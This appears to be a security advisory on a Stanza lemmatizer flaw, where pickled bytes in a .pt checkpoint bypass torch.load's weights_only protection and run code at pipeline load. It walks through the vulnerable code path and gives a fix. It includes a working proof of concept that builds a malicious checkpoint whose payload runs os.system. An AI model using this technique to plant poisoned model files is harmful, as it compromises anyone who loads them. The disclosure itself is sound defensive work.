items.title: [stanza] Stanza: RCE via pickle deserialization in the lemmatizer
items.summary: TL;DRLoading an attacker-supplied lemma .pt runs arbitrary code as the loading user. Since 1.14.0 the lemmatizer stores pos_dict as a gzip-compressed pickle in the checkpoint's dicts field (a bytes value). torch.load(weights_only=True) treats bytes as a primitive and passes it through unexamined, so its allowlist never sees the inner stream. Trainer.load then feeds those bytes to an unrestricted pickle.loads: the only bare pickle.loads in the tree. Result: weights_only=True gives no protection here, and model loading executes code.Confirmed end-to-end against stanza 1.14.0 / PyTorch 2.13.0 / CPython 3.13.7: a crafted checkpoint whose payload __reduce__ returns (os.system, (cmd,)) ran the command at load time (marker file showed uid=501(...), executed_by=...).A downstream user is vulnerable whenever they build a pipeline that loads a caller-supplied lemmatizer checkpoint. i.e. stanza.Pipeline(lang=..., processors="tokenize,pos,lemma", lemma_model_path="<attacker-influenced .pt>") (or any equivalent load of an untrusted/shared lemma model through a custom registry) - since that call routes straight into Trainer.load -> _unpack_pos_dict and executes the embedded pickle at construction time.The vulnerable pathstanza/models/lemma/trainer.py:# _pack_pos_dict (write side): pos_dict -> pickle -> gzip -> bytes, stored under checkpoint['dicts']def _unpack_pos_dict(data):                 # line 54    buf = io.BytesIO(data)    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:        raw = gz.read()    return pickle.loads(raw)                # <-- unrestricted default unpicklerdef load(self, filename, ...):              # line 365    checkpoint = torch.load(filename, ..., weights_only=True)   # outer allowlist; bytes pass through intact    ...    if dicts_version == _DICTS_VERSION_POS:                     # dicts_version == 2 (current format)        self.pos_dict = _unpack_pos_dict(checkpoint['dicts'])   # line 378, no validationReachable from the documented API. stanza.Pipeline(..., lemma_model_path=<file>) -> LemmaProcessor._set_up_model -> Trainer(model_file=…) -> Trainer.load. Any shared/distributed checkpoint, custom registry, or caller-supplied lemma_model_path reaches it. No checksum is applied to caller-supplied paths (MD5 verification exists only in the default registry download flow). Trigger is at pipeline construction, before any inference input is processed.Note: this is not the weights_only=False fallback fixed under CVE-2026-54499: the outer load stays safe; the exposure is entirely the inner pickle.Minimal PoCimport gzip, io, os, pickle, tempfile, torchfrom stanza.models.lemma.trainer import _unpack_pos_dict, _DICTS_VERSION_POSMARKER = os.path.join(tempfile.gettempdir(), "stanza_lemma_poc_pwned")class Payload:    def __reduce__(self):        return (os.system, ("id > %s 2>&1; echo executed_by=$(whoami) >> %s" % (MARKER, MARKER),))buf = io.BytesIO()with gzip.GzipFile(fileobj=buf, mode="wb") as gz:        # same shape as _pack_pos_dict()    gz.write(pickle.dumps(Payload(), protocol=4))ckpt = {"dicts": buf.getvalue(), "dicts_version": _DICTS_VERSION_POS}pt = os.path.join(tempfile.gettempdir(), "evil_lemma.pt")torch.save(ckpt, pt, _use_new_zipfile_serialization=False)loaded = torch.load(pt, lambda s, l: s, weights_only=True)   # SUCCEEDS; dicts is bytes, intact_unpack_pos_dict(loaded["dicts"])                            # == trainer.py:378 -> command runsprint("pwned:", open(MARKER).read().strip())The PoC calls _unpack_pos_dict directly: the exact expression at trainer.py:378. Reaching it through stanza.Pipeline(...) additionally requires the crafted file to carry a well-formed config/vocab so load runs to line 378 (established by source review); the deserialization to execution step is confirmed at runtime.FixDeserialize the inner stream with the RestrictedUnpickler the project already uses in stanza/models/common/doc.py (allowlists tuple/list/dict only):from stanza.models.common.doc import RestrictedUnpicklerdef _unpack_pos_dict(data):    buf = io.BytesIO(data)    with gzip.GzipFile(fileobj=buf, mode="rb") as gz:        raw = gz.read()    return RestrictedUnpickler(io.BytesIO(raw)).load()A legitimate pos_dict is a nested {pos: {word: lemma}} string mapping no class/function globals, so it loads cleanly, while any os.system-style payload is rejected by find_class. JSON would work equally well (all keys/values are strings) and remove pickle from this path entirely. Apply to both _unpack_pos_dict and, for forward compatibility, _pack_pos_dict.Referenceshttps://github.com/stanfordnlp/stanza/security/advisories/GHSA-gh9r-c94j-cmp5https://github.com/stanfordnlp/stanza/pull/1649https://github.com/stanfordnlp/stanza/commit/b21e1c9b47b4fccff21d3b0a6c0687a19410c2f0https://github.com/stanfordnlp/stanza/releases/tag/v1.15.0https://github.com/advisories/GHSA-gh9r-c94j-cmp5
